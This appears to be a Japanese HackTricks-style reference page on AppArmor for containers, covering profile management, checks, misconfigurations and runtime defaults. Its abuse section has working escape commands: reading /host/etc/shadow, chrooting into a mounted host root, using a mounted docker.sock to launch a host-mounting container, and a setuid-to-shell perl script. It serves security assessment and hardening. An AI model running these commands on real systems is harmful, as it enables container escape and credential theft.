# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## 概要

AppArmorは、プログラムごとのプロファイルによって制限を適用する**強制アクセス制御 (Mandatory Access Control)** システムです。ユーザーやグループ所有に大きく依存する従来のDACチェックとは異なり、AppArmorはカーネルがプロセス自体に紐づいたポリシーを強制します。コンテナ環境では、ワークロードが従来の権限ではある操作を試みるのに十分でも、AppArmorプロファイルが該当するパス、マウント、ネットワーク動作、あるいは capability の使用を許可していないために拒否されることがあり、これは重要です。

最も重要な概念は、AppArmorが**パスベース**であるという点です。SELinuxのようにラベルではなく、パスルールを通じてファイルシステムアクセスを判断します。これにより扱いやすく強力ですが、同時に bind mount や別のパス構成に注意を払う必要があります。ホスト上の同じコンテンツが別のパスで到達可能になると、ポリシーの効果がオペレータの最初の想定通りでない場合があります。

## コンテナ分離における役割

コンテナのセキュリティレビューはしばしば capabilities や seccomp で止まりがちですが、AppArmorはそれらのチェック後も重要です。コンテナが本来より多くの権限を持っていたり、運用上の理由で1つ余分な capability が必要だったりする場合でも、AppArmorはファイルアクセス、マウント動作、ネットワーキング、実行パターンを制約して明白な悪用経路を阻止できます。だからこそ、AppArmorを「アプリケーションを動かすためにだけ」無効にすることは、単にリスクのある設定を黙って許容するだけでなく、実際に悪用可能な状態へと静かに変えてしまうことがあります。

## ラボ

ホストでAppArmorが有効かどうかを確認するには、次を使用してください：
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
現在のコンテナプロセスがどのユーザー権限で実行されているかを確認するには:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
この違いは示唆的だ。通常、プロセスは runtime によって選ばれた profile に紐づく AppArmor コンテキストを示すはずだ。unconfined の場合、その追加の制限レイヤーは消える。  
また、Docker が何を適用したと考えているかも確認できる:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## ランタイムでの使用

ホストが対応していれば、Docker はデフォルトまたはカスタムの AppArmor プロファイルを適用できます。Podman も AppArmor ベースのシステムで AppArmor と統合できますが、SELinux を優先するディストリビューションではそちらが主役になることが多いです。Kubernetes は、実際に AppArmor をサポートするノード上でワークロード単位の AppArmor ポリシーを公開できます。LXC や Ubuntu 系の system-container 環境でも AppArmor は広く利用されています。

実務上のポイントは、AppArmor が「Docker 固有の機能」ではないということです。複数のランタイムが選んで適用できるホストカーネルの機能です。ホストが対応していないか、ランタイムが unconfined で実行されるよう指示されている場合、想定される保護は実際には存在しません。

Docker 対応の AppArmor ホストでは、最も知られたデフォルトは `docker-default` です。そのプロファイルは Moby の AppArmor テンプレートから生成され、なぜ一部の capability ベースの PoC がデフォルトコンテナで失敗するかを説明する上で重要です。大まかに言えば、`docker-default` は通常のネットワーキングを許可し、`/proc` の大部分への書き込みを拒否し、`/sys` の機密部分へのアクセスを拒否し、マウント操作をブロックし、ptrace を制限して一般的なホスト探索プリミティブにならないようにします。そのベースラインを理解することで "the container has `CAP_SYS_ADMIN`" と "the container can actually use that capability against the kernel interfaces I care about" を区別する助けになります。

## プロファイル管理

AppArmor のプロファイルは通常 `/etc/apparmor.d/` に格納されます。一般的な命名規則として、実行ファイルのパス内のスラッシュをドットに置き換えます。例えば、`/usr/bin/man` のプロファイルは通常 `/etc/apparmor.d/usr.bin.man` として保存されます。この点は防御と評価の両方で重要で、アクティブなプロファイル名が分かれば、対応するファイルをホスト上で素早く特定できることが多いからです。

ホスト側で役立つ管理コマンドには次のようなものがあります:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
これらのコマンドが container-security リファレンスで重要である理由は、プロファイルが実際にどのように構築され、ロードされ、complain mode に切り替えられ、アプリケーションの変更後に修正されるかを説明しているからです。オペレータがトラブルシューティングの際にプロファイルを complain mode に移してしまい、enforcement を復元するのを忘れる習慣があると、ドキュメント上はコンテナが保護されているように見えても、実際にははるかに緩く動作している可能性があります。

### プロファイルの作成と更新

`aa-genprof` はアプリケーションの挙動を観察し、対話的にプロファイルの生成を支援できます:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` は後で `apparmor_parser` で読み込めるテンプレートプロファイルを生成できます:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
バイナリが変更されポリシーを更新する必要があるとき、`aa-logprof` はログに記録された拒否を再生し、オペレーターがそれらを許可するか拒否するか判断するのを支援します：
```bash
sudo aa-logprof
```
### ログ

AppArmor の拒否は、`auditd`、syslog、または `aa-notify` のようなツールで確認できることが多い:
```bash
sudo aa-notify -s 1 -v
```
これは運用上および攻撃側にとっても有用です。防御側はプロファイルの調整に、攻撃者はどの正確なパスや操作が拒否されているか、またAppArmorがエクスプロイト連鎖を阻止している制御かどうかを把握するために利用します。

### 正確なプロファイルファイルの特定

ランタイムがコンテナに対して特定のAppArmorプロファイル名を表示する場合、その名前をディスク上のプロファイルファイルに紐づけることがしばしば有用である:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
これは特にホスト側でのレビュー時に有用です。コンテナがプロファイル `lowpriv` の下で実行されていると言っている状態と、実際のルールが監査やリロードが可能な特定のファイルに存在するという事実とのギャップを埋めるからです。

## 誤設定

最も明白なミスは `apparmor=unconfined` です。管理者はプロファイルが正しく危険または予期しない動作をブロックしたためにアプリケーションのデバッグ中にこれを設定することがよくあります。そのフラグが本番環境に残ると、MAC レイヤ全体が事実上取り除かれたことになります。

別の微妙な問題は、ファイルのパーミッションが正常に見えるため bind mounts を無害だと仮定することです。AppArmor はパスベースなので、ホストのパスを別のマウント位置で露出させるとパスルールと悪い相互作用を起こす可能性があります。3つ目のミスは、ホストカーネルが実際に AppArmor を強制していない場合、設定ファイル内のプロファイル名はほとんど意味を持たないことを忘れることです。

## 悪用

AppArmor が無効になると、以前は制限されていた操作が突然可能になることがあります: bind mounts 経由で機密性の高いパスを読むこと、使用がより困難であるべき procfs や sysfs の一部にアクセスすること、capabilities/seccomp が許す場合にマウント関連の操作を行うこと、あるいはプロファイルが通常拒否するようなパスを使うことなどです。AppArmor は、capability-based breakout attempt が「理論上は動作するはず」なのに実際には失敗する理由を説明することが多いメカニズムです。AppArmor を取り除くと、同じ試みが成功し始めるかもしれません。

もし AppArmor が path-traversal、bind-mount、または mount-based の悪用チェーンを阻止している主な要因だと思われる場合、最初のステップは通常、プロファイル有りと無しでアクセス可能になるものを比較することです。例えば、ホストのパスがコンテナ内にマウントされている場合、まずそれがトラバースできて読み取れるかどうかを確認してください:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
コンテナが `CAP_SYS_ADMIN` のような危険な capability を持っている場合、最も実用的なテストの一つは、AppArmor がマウント操作や機密性の高いカーネルファイルシステムへのアクセスをブロックしているかどうかを確認することです:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
bind mount を介して host path が既に利用可能な環境では、AppArmor を失うことで、read-only information-disclosure issue がホストのファイルへ直接アクセスできる状態に変わることもあります:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
これらのコマンドの意図は、AppArmor 単独が breakout を発生させるということではありません。AppArmor が取り除かれると、ファイルシステムやマウントベースの悪用経路の多くが即座にテスト可能になる、という点です。

### 完全な例: AppArmor 無効化 + ホストルートのマウント

もし container がホストルートを `/host` に bind-mounted している場合、AppArmor を除去することで、ブロックされていたファイルシステムの悪用経路が完全な host escape に変わることがあります:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
一度 shell が host filesystem 経由で実行されると、workload は事実上 container boundary を脱出したことになります:
```bash
id
hostname
cat /etc/shadow | head
```
### 完全な例: AppArmor 無効化 + Runtime Socket

もし実際の障壁が runtime state を保護している AppArmor であった場合、マウントされた socket が完全な脱出に十分であることがある:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
正確なパスはマウントポイントによって異なりますが、結果は同じです: AppArmor はもはや runtime API へのアクセスを防いでおらず、runtime API はホストを侵害するコンテナを起動できます。

### 完全な例: Path-Based Bind-Mount Bypass

AppArmor はパスベースで動作するため、`/proc/**` を保護しても、同じホストの procfs コンテンツが別のパスから到達可能な場合には自動的に保護されるわけではありません:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
影響は正確に何がマウントされているか、および代替パスが他の制御もバイパスするかどうかによりますが、このパターンは AppArmor を単独で評価するのではなく、マウントレイアウトと一緒に評価しなければならない最も明確な理由の一つです。

### 完全な例: Shebang Bypass

AppArmor policy はインタプリタのパスを対象にすることがあり、shebang によるスクリプト実行を完全には考慮していない場合があります。歴史的な例としては、先頭行が隔離されたインタプリタを指すスクリプトを使用するものがありました：
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
このような例は、プロファイルの意図と実際の実行意味論が乖離することがあるという重要な注意喚起になります。コンテナ環境でAppArmorをレビューする際は、インタプリタチェーンや代替実行経路に特に注意を払う必要があります。

## チェック

これらのチェックの目的は、次の3つの質問に素早く答えることです: ホストでAppArmorが有効になっているか、現在のプロセスが制限されているか、そしてランタイムがこのコンテナに実際にプロファイルを適用したかどうか。
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
```
ここで注目すべき点:

- `/proc/self/attr/current` が `unconfined` を示している場合、ワークロードは AppArmor の制約の恩恵を受けていません。
- `aa-status` が AppArmor が disabled または not loaded を示している場合、runtime config のプロファイル名は主に見た目だけのものです。
- `docker inspect` が `unconfined` または予期しないカスタムプロファイルを示している場合、それがファイルシステムやマウントを悪用する経路が成功する主な理由であることが多いです。

コンテナが運用上の理由で既に特権を持っている場合、AppArmor を有効にしておくことで、制御された例外とより広範なセキュリティ障害の差が生じることがよくあります。

## ランタイムのデフォルト

| Runtime / プラットフォーム | デフォルトの状態 | デフォルトの動作 | よくある手動による弱体化 |
| --- | --- | --- | --- |
| Docker Engine | AppArmor 対応ホストではデフォルトで有効 | 上書きされない限り、`docker-default` AppArmor プロファイルを使用します | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | ホスト依存 | AppArmor は `--security-opt` を通じてサポートされますが、正確なデフォルトはホスト/ランタイム依存であり、Docker のドキュメント化された `docker-default` プロファイルほど普遍的ではありません | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | 条件付きデフォルト | `appArmorProfile.type` が指定されていない場合、デフォルトは `RuntimeDefault` ですが、ノードで AppArmor が有効になっている場合にのみ適用されます | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost`（弱いプロファイル）、AppArmor をサポートしていないノード |
| containerd / CRI-O under Kubernetes | ノード/ランタイムのサポートに従う | 一般的な Kubernetes 対応ランタイムは AppArmor をサポートしますが、実際の強制はノードのサポートやワークロード設定に依存します | Kubernetes 行と同様。直接のランタイム設定で AppArmor を完全にスキップすることもできます |

AppArmor において、最も重要な変数はしばしばランタイムではなく **ホスト** です。マニフェストでのプロファイル設定は、AppArmor が有効でないノード上では制約を生みません。
{{#include ../../../../banners/hacktricks-training.md}}
